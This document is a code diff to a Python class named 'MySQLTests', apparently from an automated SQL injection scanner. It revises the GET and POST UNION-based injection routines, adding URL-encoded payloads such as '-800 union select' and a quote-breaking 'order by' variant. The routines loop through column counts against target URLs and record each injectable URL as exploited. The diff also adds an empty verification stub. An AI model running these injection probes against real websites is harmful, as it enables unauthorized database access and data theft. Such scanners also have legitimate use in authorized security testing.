@@ -22,6 +22,10 @@ class MySQLTests:
 		self.errorarr = { "'", '"'}
 		self.answershow = 1
 
+	def verifyVuln(self, url):
+		print "verify"
+		
+
 	def cleanURL(self, url):
 		url = url.replace("./", "/");
 		return url;
@@ -64,25 +68,23 @@ class MySQLTests:
 			posturl = self.cleanURL(spliturl[0])
 			postvars = self.cleanPostVars(spliturl[1])
 			urlvalues = urllib.urlencode(postvars)
-			testUrl = urlvalues.replace("%5BXX%5D", "1%20union%20select%20[VARS]");
+			testUrl = urlvalues.replace("%5BXX%5D", "-800%20union%20select%20%5BVARS%5D");
 			for x in range(self.unionstart, self.unionfinish):
 				if len(unionvars) > 0:
 					unionvars += ","
 					nullvars += ","
 				unionvars += str(x) + uniqid
 				nullvars += "NULL"
-				unionurl = testUrl.replace("[VARS]", unionvars)
-				nullurl = testUrl.replace("[VARS]", nullvars)
+				unionurl = testUrl.replace("%5BVARS%5D", unionvars)
+				nullurl = testUrl.replace("%5BVARS%5D", nullvars)
 				postreq = urllib2.Request(posturl, unionurl, self.headers)
 				content = urllib2.urlopen(postreq).read()
 				if uniqid in content:
 					self.injectionurl = unionurl.replace(uniqid, "")
 					print colored("[+] [{1}] MySQL POST Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
-					print unionurl
 					self.exploited[nullurl] = x
 					self.totalVulns['UNION'] += 1
 					return x
-			return False
 		except Exception:
 			print colored("[-] [{0}] An error has occured".format(func.showTime()), "red")
 
@@ -106,25 +108,27 @@ class MySQLTests:
 
 	def getUnionTest(self, url):
 		try:
-			unionvars = ""
-			nullvars = ""
-			uniqid = "726486"
-			testUrl = url.replace("[XX]", "1%20union%20select%20[VARS]");
-			for x in range(1, self.unionfinish):
-				if len(unionvars) > 0:
-					unionvars += ","
-					nullvars += ","
-				unionvars += str(x) + uniqid
-				nullvars += "NULL"
-				unionurl = testUrl.replace("[VARS]", unionvars)
-				nullurl = testUrl.replace("[VARS]", nullvars)
-				content = urllib2.urlopen(unionurl).read()
-				if uniqid in content:
-					self.injectionurl = unionurl.replace(uniqid, "")
-					print colored("[+] [{1}] MySQL GET Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
-					self.exploited[nullurl] = x
-					self.totalVulns['UNION'] += 1
-					return x
+			testlist = ["-800%20union%20select%20[VARS]", "-800%27%20union%20select%20[VARS]%20order%20by%20%271"]
+			for sqlvars in testlist:
+				unionvars = ""
+				nullvars = ""
+				uniqid = "726486"
+				testUrl = url.replace("[XX]", sqlvars);
+				for x in range(1, self.unionfinish):
+					if len(unionvars) > 0:
+						unionvars += ","
+						nullvars += ","
+					unionvars += str(x) + uniqid
+					nullvars += "NULL"
+					unionurl = testUrl.replace("[VARS]", unionvars)
+					nullurl = testUrl.replace("[VARS]", nullvars)
+					content = urllib2.urlopen(unionurl).read()
+					if uniqid in content:
+						self.injectionurl = unionurl.replace(uniqid, "")
+						print colored("[+] [{1}] MySQL GET Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
+						self.exploited[nullurl] = x
+						self.totalVulns['UNION'] += 1
+						return x
 			return False
 		except Exception:
 			print colored("[-] [{0}] An error has occured".format(func.showTime()), "red")
